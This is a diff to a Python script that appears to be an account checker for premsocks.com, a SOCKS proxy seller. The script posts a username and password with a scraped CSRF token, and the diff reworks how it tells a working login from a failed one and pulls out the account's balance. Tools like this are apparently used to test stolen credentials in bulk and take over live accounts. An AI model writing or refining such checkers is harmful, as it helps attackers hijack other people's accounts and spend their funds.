@@ -1,6 +1,6 @@
 """
 Checker for Premsocks (premsocks.com)
-Fixes false positives, extracts and displays available balance.
+Accurate success/failure detection using user panel and balance element.
 """
 import re
 import threading
@@ -49,7 +49,6 @@ def check(username: str, password: str) -> Tuple[bool, str]:
         token_match = re.search(r'<input[^>]*name="_token"[^>]*value="([^"]+)"', html, re.I)
         csrf_token = token_match.group(1) if token_match else ""
 
-        # Build payload
         payload = {
             "username": username,
             "password": password,
@@ -64,46 +63,33 @@ def check(username: str, password: str) -> Tuple[bool, str]:
         post_resp = session.post(LOGIN_URL, data=payload, allow_redirects=True, timeout=TIMEOUT)
 
         final_html = post_resp.text
-        final_html_lower = final_html.lower()
         final_url = post_resp.url.lower()
 
-        # --- FIRST: Check for error messages ---
-        error_phrases = [
-            "these credentials do not match our records",
-            "invalid",
-            "incorrect",
-            "wrong",
-            "error",
-            "alert alert-danger",
-            "alert-danger",
-            "class=\"error\"",
-        ]
-        for phrase in error_phrases:
-            if phrase in final_html_lower:
-                error_msg = re.search(r'<div[^>]*class="[^"]*alert[^"]*"[^>]*>(.*?)</div>', final_html, re.I | re.S)
-                if error_msg:
-                    return False, f"Login failed: {error_msg.group(1).strip()}"
-                return False, "Invalid credentials"
-
-        # --- SECOND: Check for success indicators ---
-        if "logout" in final_html_lower or 'id="user"' in final_html_lower:
-            # Extract balance
-            balance_match = re.search(r'<span[^>]*id="balance-text"[^>]*>(.*?)</span>', final_html, re.I)
-            balance = balance_match.group(1).strip() if balance_match else "N/A"
+        # --- Check for balance element (strongest success signal) ---
+        balance_match = re.search(r'<span[^>]*id="balance-text"[^>]*>(.*?)</span>', final_html, re.I)
+        if balance_match:
+            balance = balance_match.group(1).strip()
             return True, f"Login successful. Balance: {balance}"
 
+        # --- Check user panel: if it shows "Login/Reg", it's a failure ---
+        user_panel_match = re.search(r'<a[^>]*class="[^"]*top icon user[^"]*"[^>]*>(.*?)</a>', final_html, re.I)
+        if user_panel_match:
+            user_text = user_panel_match.group(1).strip()
+            if user_text.lower() == "login/reg":
+                return False, "Invalid credentials (user panel shows Login/Reg)"
+            # If it shows a username, but no balance, maybe success but balance missing
+            # We'll treat as success with no balance
+            return True, f"Login successful. Balance: N/A"
+
+        # --- Fallback: check for logout link ---
+        if "logout" in final_html.lower():
+            return True, "Login successful. Balance: N/A"
+
+        # --- If we are on the socks-proxy page, probably success ---
         if "socks-proxy" in final_url:
-            # Sometimes the balance might be on the redirected page (if we allowed redirects, we get that page)
-            # Try to extract balance from final_html anyway
-            balance_match = re.search(r'<span[^>]*id="balance-text"[^>]*>(.*?)</span>', final_html, re.I)
-            balance = balance_match.group(1).strip() if balance_match else "N/A"
-            return True, f"Login successful (redirected to socks list). Balance: {balance}"
+            return True, "Login successful (redirected to socks list). Balance: N/A"
 
-        # --- THIRD: If still on login page (has login form) ---
-        if 'name="username"' in final_html_lower and 'name="password"' in final_html_lower:
-            return False, "Login failed – still on login page (no error shown)"
-
-        # --- FALLBACK ---
+        # --- Otherwise, failure ---
         return False, "Login failed – unknown response"
 
     except Exception as e:
